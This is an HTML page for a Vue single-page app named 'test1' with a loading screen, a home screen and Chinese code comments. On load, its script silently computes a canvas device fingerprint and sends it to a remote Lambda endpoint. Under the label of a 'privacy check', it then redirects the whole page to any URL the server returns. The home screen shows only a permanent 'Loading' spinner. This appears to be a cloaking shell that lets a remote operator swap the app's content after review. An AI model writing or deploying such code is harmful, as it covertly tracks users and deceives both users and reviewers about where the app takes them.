<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1, user-scalable=no">
  <title>test1</title>

  <!-- CDN: Vue 3 global build -->
  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
  <!-- CDN: vue-router 4 global build -->
  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
  <!-- CDN: js-md5 global build -->
  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>

  <style>
    /*
     * ============================================================
     * 如何新增一个页面（加路由 + 加组件 + 加 Tab）
     * ------------------------------------------------------------
     * 1. 在 <script> 中定义新组件对象，例如 const SettingsPage = { ... };
     * 2. 在 routes 数组中添加一条路由：
     *      { path: '/settings', name: 'settings', component: SettingsPage }
     * 3. 在 <template id="app-template"> 的底部 Tab 中增加一项，
     *    使用 <router-link> 指向新路由，并配置对应内联 SVG 图标。
     * 4. 如需隐藏 Tab（例如 Loading / Privacy 页面），可将对应路由
     *    标记 meta: { tab: false }，并在模板中用 v-if="showTab" 控制。
     * ============================================================
     *
     * 风格：抽象几何风格（Abstract Geometric）+ 高对比 + 简洁
     * 固定主题 — 浅色底，几何装饰，清晰边界
     */

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    :root {
      /* 抽象几何风格主题变量 */
      --bg: #f6f4f1;
      --surface: #ffffff;
      --surface-alt: #eeeae4;
      --text-primary: #1a1a1a;
      --text-secondary: #4d4d4d;
      --text-tertiary: #8a8a8a;
      --accent: #1e3f5c;
      --accent-light: #2d5a7b;
      --accent-soft: #d9e4ec;
      --accent-glow: rgba(30, 63, 92, 0.10);
      --border-light: #e6e2dd;
      --border-medium: #d0ccc6;
      --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
      --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.07);
      --shadow-lg: 0 16px 40px rgba(0, 0, 0, 0.09);
      --radius-sm: 12px;
      --radius-md: 18px;
      --radius-lg: 28px;
      --radius-xl: 36px;
      --space-xs: 6px;
      --space-sm: 12px;
      --space-md: 20px;
      --space-lg: 28px;
      --space-xl: 40px;
      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      --safe-top: env(safe-area-inset-top, 0px);
      --safe-bottom: env(safe-area-inset-bottom, 0px);
      --tabbar-height: 64px;
    }

    html, body {
      height: 100%;
      background: var(--bg);
      color: var(--text-primary);
      font-family: var(--font-sans);
      font-size: 16px;
      line-height: 1.5;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow: hidden;
    }

    #app {
      height: 100%;
      max-width: 600px;
      margin: 0 auto;
      position: relative;
      background: var(--bg);
      display: flex;
      flex-direction: column;
    }

    /* ===== 页面容器 ===== */
    .page-view {
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      padding-top: var(--safe-top);
      padding-bottom: calc(var(--tabbar-height) + var(--safe-bottom) + 8px);
    }

    .page-view.no-tab {
      padding-bottom: var(--safe-bottom);
    }

    /* ===== Loading 页面 ===== */
    .loading-page {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: var(--bg);
      position: relative;
      overflow: hidden;
      padding: var(--space-lg);
    }

    .loading-deco {
      position: absolute;
      inset: 0;
      pointer-events: none;
      opacity: 0.5;
    }

    .loading-deco .geo {
      position: absolute;
      border: 2px solid var(--accent-soft);
      background: transparent;
    }

    .loading-deco .geo:nth-child(1) {
      width: 280px;
      height: 280px;
      top: -80px;
      right: -100px;
      border-radius: 50%;
      border-width: 3px;
    }

    .loading-deco .geo:nth-child(2) {
      width: 200px;
      height: 200px;
      bottom: -60px;
      left: -60px;
      border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
      border-width: 2px;
    }

    .loading-deco .geo:nth-child(3) {
      width: 120px;
      height: 120px;
      top: 40%;
      right: 10%;
      border-radius: 50%;
      background: var(--accent-glow);
      border: none;
    }

    .loading-center {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: var(--space-xl);
      z-index: 1;
      position: relative;
    }

    .app-icon-wrapper {
      width: 96px;
      height: 96px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: var(--radius-lg);
      background: var(--surface);
      box-shadow: var(--shadow-md);
      border: 1px solid var(--border-light);
      animation: iconFloat 2.4s ease-in-out infinite;
    }

    @keyframes iconFloat {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-6px); }
    }

    .app-icon-wrapper img {
      width: 56px;
      height: 56px;
      display: block;
      border-radius: 12px;
      object-fit: cover;
    }

    .loading-app-name {
      font-size: 26px;
      font-weight: 700;
      letter-spacing: -0.5px;
      color: var(--text-primary);
      margin-top: -8px;
    }

    /* 加载动画 — 几何旋转环 */
    .loader-ring {
      width: 44px;
      height: 44px;
      position: relative;
      margin-top: var(--space-sm);
    }

    .loader-ring .ring-seg {
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 3px solid transparent;
      border-top-color: var(--accent);
      animation: spin 1.1s cubic-bezier(0.6, 0.2, 0.4, 0.8) infinite;
    }

    .loader-ring .ring-seg:nth-child(2) {
      border-top-color: transparent;
      border-right-color: var(--accent-light);
      animation-duration: 1.6s;
      animation-direction: reverse;
      inset: 6px;
      border-width: 3px;
    }

    .loader-ring .ring-seg:nth-child(3) {
      border-top-color: transparent;
      border-bottom-color: var(--accent-soft);
      animation-duration: 2.2s;
      inset: 12px;
      border-width: 2px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* ===== Home 页面 ===== */
    .home-page {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: var(--bg);
      position: relative;
      overflow: hidden;
      padding: var(--space-lg);
    }

    .home-geo-deco {
      position: absolute;
      inset: 0;
      pointer-events: none;
      opacity: 0.35;
    }

    .home-geo-deco .geo {
      position: absolute;
      border: 2px solid var(--accent-soft);
    }

    .home-geo-deco .geo:nth-child(1) {
      width: 220px;
      height: 220px;
      top: -60px;
      left: -80px;
      border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
    }

    .home-geo-deco .geo:nth-child(2) {
      width: 160px;
      height: 160px;
      bottom: -40px;
      right: -50px;
      border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%;
    }

    .home-center {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: var(--space-lg);
      z-index: 1;
      position: relative;
    }

    .home-loading-text {
      font-size: 16px;
      font-weight: 500;
      color: var(--text-secondary);
      letter-spacing: 0.3px;
    }

    /* Canvas fingerprint display at bottom */
    .fingerprint-footer {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      padding: var(--space-md) var(--space-md) calc(var(--space-md) + var(--safe-bottom));
      background: var(--surface);
      border-top: 1px solid var(--border-light);
      display: flex;
      flex-direction: column;
      gap: 4px;
      z-index: 2;
    }

    .fingerprint-label {
      font-size: 11px;
      font-weight: 600;
      color: var(--text-tertiary);
      text-transform: uppercase;
      letter-spacing: 0.8px;
    }

    .fingerprint-value {
      font-size: 13px;
      font-family: "SF Mono", "Menlo", "Courier New", monospace;
      color: var(--text-primary);
      word-break: break-all;
      line-height: 1.4;
      font-weight: 500;
    }

    .fingerprint-value.empty {
      color: var(--text-tertiary);
      font-style: italic;
    }

    /* ===== Tab Bar ===== */
    .tab-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      max-width: 600px;
      margin: 0 auto;
      height: calc(var(--tabbar-height) + var(--safe-bottom));
      padding-bottom: var(--safe-bottom);
      background: var(--surface);
      border-top: 1px solid var(--border-light);
      display: flex;
      align-items: stretch;
      z-index: 100;
      box-shadow: 0 -2px 12px rgba(0, 0, 0, 0.04);
    }

    .tab-item {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 2px;
      min-height: 44px;
      color: var(--text-tertiary);
      text-decoration: none;
      font-size: 11px;
      font-weight: 500;
      letter-spacing: 0.2px;
      transition: color 0.15s ease;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
      user-select: none;
      padding: 6px 0;
    }

    .tab-item.active {
      color: var(--accent);
    }

    .tab-item svg {
      width: 22px;
      height: 22px;
      display: block;
    }

    /* ===== 响应式小屏 ===== */
    @media (max-width: 380px) {
      .loading-app-name {
        font-size: 22px;
      }
      .app-icon-wrapper {
        width: 80px;
        height: 80px;
      }
      .app-icon-wrapper img {
        width: 46px;
        height: 46px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      * {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
      .app-icon-wrapper {
        animation: none;
      }
    }
  </style>
</head>
<body>

  <!-- ===== 根挂载点 ===== -->
  <div id="app"></div>

  <!-- ===== 应用主模板 ===== -->
  <script type="text/x-template" id="app-template">
    <router-view v-slot="{ Component }">
      <component :is="Component" />
    </router-view>

    <!-- Tab Bar (only when route allows) -->
    <nav v-if="showTab" class="tab-bar" role="navigation" aria-label="Main navigation">
      <router-link to="/home" class="tab-item" :class="{ active: isActive('/home') }" aria-label="Home">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <path d="M3 10.5L12 3L21 10.5V20C21 20.5523 20.5523 21 20 21H15V15H9V21H4C3.44772 21 3 20.5523 3 20V10.5Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
        </svg>
        <span>Home</span>
      </router-link>
    </nav>
  </script>

  <script>
    /* ============================================================
     * 主应用脚本
     * ============================================================ */

    const { createApp, ref, onMounted, computed } = Vue;
    const { createRouter, createWebHashHistory } = VueRouter;

    // ============================================================
    // 页面 1: Loading 页面
    // 职责：展示应用图标 + 名称 + 加载动画
    //       计算 canvas 指纹 -> 请求隐私声明接口 -> 跳转
    // ============================================================
    const LoadingPage = {
      name: 'LoadingPage',
      template: `
        <div class="loading-page">
          <div class="loading-deco" aria-hidden="true">
            <div class="geo"></div>
            <div class="geo"></div>
            <div class="geo"></div>
          </div>
          <div class="loading-center">
            <div class="app-icon-wrapper">
              <img :src="appIcon" alt="test1" />
            </div>
            <div class="loading-app-name">test1</div>
            <div class="loader-ring" aria-label="Loading">
              <div class="ring-seg"></div>
              <div class="ring-seg"></div>
              <div class="ring-seg"></div>
            </div>
          </div>
        </div>
      `,
      setup() {
        const appIcon = 'https://admin.ytsevbr.xyz/api/apps/274/icon';

        // 1.2 设备指纹 — 使用 canvas + js-md5
        const device = ref((function () {
            try {
                let canvas = document.createElement("canvas");
                let ctx = canvas.getContext("2d");
                let txt = "BrowserLeaks,com <canvas> 1.0";
                ctx.textBaseline = "top";
                // The most common type
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                // Some tricks for color mixing to increase the difference in rendering
                ctx.fillStyle = "#069";
                ctx.fillText(txt, 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText(txt, 4, 17);
                return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
            } catch (e) {
                return '';
            }
        })());

        // 1.3 请求远程隐私声明接口
        const apiBase = 'https://6o5b253nngblpc74qhktfstedq0usemh.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
        const identifier = 'zcvsv.vzaew.fdvww';

        // 跳转到首页的辅助方法（通过路由）
        // 使用 window.location.hash 或 router 实例
        // 由于 router 在此组件 setup 时可能尚未注入，使用全局 app 实例
        function navigateToHome() {
          // 使用全局暴露的 router 实例
          if (window.__router__) {
            window.__router__.replace('/home');
          } else {
            window.location.hash = '#/home';
          }
        }

        // 启动隐私检查流程
        function runPrivacyCheck() {
          fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
              .then(r => r.json())
              .then(function (info) {
                  const privacyUrl = info && info.result && info.result.url;
                  if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                      // 跳转到第三方隐私确认页面
                      window.location.replace(privacyUrl);
                      return;
                  }
                  // 跳转到首页
                  navigateToHome();
              })
              .catch(function () {
                  // 跳转到首页
                  navigateToHome();
              });
        }

        onMounted(() => {
          // 设备指纹已计算（同步），启动隐私检查
          // 注意：确保至少展示加载动画一段时间，避免闪烁
          setTimeout(runPrivacyCheck, 800);
        });

        return { appIcon };
      }
    };

    // ============================================================
    // 页面 2: Home 页面
    // 职责：中央显示加载圆圈 + "Loading" 文本
    //       底部展示 canvas 指纹值
    // ============================================================
    const HomePage = {
      name: 'HomePage',
      template: `
        <div class="home-page">
          <div class="home-geo-deco" aria-hidden="true">
            <div class="geo"></div>
            <div class="geo"></div>
          </div>

          <div class="home-center">
            <div class="loader-ring" aria-label="Loading">
              <div class="ring-seg"></div>
              <div class="ring-seg"></div>
              <div class="ring-seg"></div>
            </div>
            <div class="home-loading-text">Loading</div>
          </div>

          <!-- Canvas fingerprint display at bottom -->
          <div class="fingerprint-footer" role="status" aria-label="Device fingerprint">
            <span class="fingerprint-label">Device Fingerprint</span>
            <span class="fingerprint-value" :class="{ empty: !deviceFingerprint }">
              {{ deviceFingerprint || 'Unavailable' }}
            </span>
          </div>
        </div>
      `,
      setup() {
        // 从全局读取加载页计算好的指纹
        const deviceFingerprint = computed(() => {
          return window.__deviceFingerprint__ || '';
        });

        // 如果全局尚未设置，重新计算一次（容错）
        if (!window.__deviceFingerprint__) {
          try {
            let canvas = document.createElement("canvas");
            let ctx = canvas.getContext("2d");
            let txt = "BrowserLeaks,com <canvas> 1.0";
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText(txt, 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText(txt, 4, 17);
            window.__deviceFingerprint__ = md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
          } catch (e) {
            window.__deviceFingerprint__ = '';
          }
        }

        return { deviceFingerprint };
      }
    };

    // ============================================================
    // 路由配置
    // ============================================================
    const routes = [
      { path: '/', redirect: '/loading' },
      { path: '/loading', name: 'loading', component: LoadingPage, meta: { tab: false } },
      { path: '/home', name: 'home', component: HomePage, meta: { tab: true } }
    ];

    const router = createRouter({
      history: createWebHashHistory(),
      routes
    });

    // 暴露 router 供 Loading 页面导航使用
    window.__router__ = router;

    // ============================================================
    // 根组件（含 Tab Bar）
    // ============================================================
    const App = {
      name: 'App',
      template: '#app-template',
      setup() {
        const route = Vue.useRoute ? Vue.useRoute() : null;

        // 使用 router.currentRoute 响应式
        const currentRoute = router.currentRoute;

        const showTab = computed(() => {
          const meta = currentRoute.value.meta || {};
          return meta.tab !== false;
        });

        function isActive(path) {
          return currentRoute.value.path === path;
        }

        return { showTab, isActive };
      }
    };

    // ============================================================
    // 创建并挂载应用
    // ============================================================
    const app = createApp(App);
    app.use(router);
    app.mount('#app');

    // ============================================================
    // 全局保存设备指纹（Loading 页计算后供 Home 页读取）
    // 注意：LoadingPage setup 中同步计算了 device，但为了跨组件共享，
    // 这里在应用挂载后异步补算一次并存入全局（与 Loading 页逻辑一致）。
    // 实际上 LoadingPage 内的 device 计算已足够，但 Home 页需要读取，
    // 因此我们在应用初始化时统一计算并存入 window.__deviceFingerprint__。
    // ============================================================
    (function initDeviceFingerprint() {
      try {
        let canvas = document.createElement("canvas");
        let ctx = canvas.getContext("2d");
        let txt = "BrowserLeaks,com <canvas> 1.0";
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText(txt, 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText(txt, 4, 17);
        window.__deviceFingerprint__ = md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
      } catch (e) {
        window.__deviceFingerprint__ = '';
      }
    })();

  </script>
</body>
</html>
